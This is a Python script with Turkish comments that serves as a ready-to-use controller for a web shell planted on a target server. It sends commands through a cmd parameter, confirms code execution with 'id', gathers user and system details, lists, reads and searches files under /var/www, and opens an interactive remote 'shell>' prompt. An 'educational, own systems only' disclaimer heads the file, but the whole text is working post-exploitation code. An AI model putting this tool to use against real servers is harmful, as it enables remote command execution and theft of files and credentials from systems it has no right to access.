#!/usr/bin/env python3
"""
Web Shell Test Script (Eğitim Amaçlı)
⚠️ SADECE KENDI SİSTEMLERİNİZİ TEST ETMEK İÇİN KULLANIN!
"""

import requests  # type: ignore
import urllib.parse
import sys
from typing import Optional

class WebShellTester:
    """Web shell test sınıfı"""
    
    def __init__(self, url: str):
        self.url = url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)'
        })
    
    def execute(self, command: str) -> Optional[str]:
        """Komut çalıştır"""
        try:
            encoded_cmd = urllib.parse.quote(command)
            full_url = f"{self.url}?cmd={encoded_cmd}"
            
            response = self.session.get(full_url, timeout=10)
            return response.text
        except Exception as e:
            return f"Error: {e}"
    
    def test_connection(self) -> bool:
        """Web shell'in çalışıp çalışmadığını test et"""
        result = self.execute("id")
        return "uid=" in result.lower() or "gid=" in result.lower()
    
    def get_system_info(self) -> dict:
        """Sistem bilgisi topla"""
        info = {}
        
        info['id'] = self.execute("id")
        info['whoami'] = self.execute("whoami")
        info['pwd'] = self.execute("pwd")
        info['uname'] = self.execute("uname -a")
        info['hostname'] = self.execute("hostname")
        
        return info
    
    def list_files(self, directory: str = ".") -> str:
        """Dosya listesi"""
        return self.execute(f"ls -la {directory}")
    
    def read_file(self, filepath: str) -> str:
        """Dosya oku"""
        return self.execute(f"cat {filepath}")
    
    def find_files(self, pattern: str, directory: str = "/var/www") -> str:
        """Dosya ara"""
        return self.execute(f"find {directory} -name '{pattern}' -type f 2>/dev/null")


def main():
    """Ana fonksiyon"""
    if len(sys.argv) < 2:
        print("Kullanım: python3 test_webshell.py <web_shell_url>")
        print("Örnek: python3 test_webshell.py http://target.com/shell.php")
        sys.exit(1)
    
    url = sys.argv[1]
    
    print("=" * 60)
    print("Web Shell Test Script (Eğitim Amaçlı)")
    print("=" * 60)
    print(f"Target: {url}\n")
    
    tester = WebShellTester(url)
    
    # Bağlantı testi
    print("[*] Bağlantı testi yapılıyor...")
    if tester.test_connection():
        print("[✓] Web shell çalışıyor!")
    else:
        print("[✗] Web shell çalışmıyor veya erişilemiyor.")
        sys.exit(1)
    
    print("\n" + "=" * 60)
    print("Sistem Bilgileri")
    print("=" * 60)
    
    # Sistem bilgisi
    info = tester.get_system_info()
    for key, value in info.items():
        print(f"\n[{key}]")
        print(value[:500])  # İlk 500 karakter
    
    print("\n" + "=" * 60)
    print("İnteraktif Mod")
    print("=" * 60)
    print("Komut çalıştırmak için komut girin (çıkmak için 'exit' veya 'quit')")
    print()
    
    # İnteraktif mod
    while True:
        try:
            command = input("shell> ").strip()
            
            if command.lower() in ['exit', 'quit', 'q']:
                print("\n[!] Çıkılıyor...")
                break
            
            if not command:
                continue
            
            result = tester.execute(command)
            print(result[:2000])  # İlk 2000 karakter
            print()
            
        except KeyboardInterrupt:
            print("\n[!] Çıkılıyor...")
            break
        except Exception as e:
            print(f"[✗] Hata: {e}")


if __name__ == '__main__':
    main()

